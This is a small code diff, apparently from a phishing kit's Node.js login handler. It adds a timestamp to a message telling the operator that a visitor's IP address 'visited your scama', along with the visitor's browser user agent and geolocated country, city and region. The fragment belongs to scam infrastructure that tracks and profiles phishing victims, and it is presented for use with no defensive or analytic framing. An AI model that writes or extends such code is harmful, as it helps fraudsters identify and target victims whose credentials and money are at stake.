@@ -20,7 +20,7 @@ exports.login = async (req, res) => {
     
         const ipAddress = getClientIp(req);
         const ipAddressInformation = await sendAPIRequest(ipAddress);
-    
+        const currentDate = new Date();
         try {
     
             message += ` ✈️ ${ipAddress} visited your scama on ${currentDate}\n 🌐 ${userAgent}\n 📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
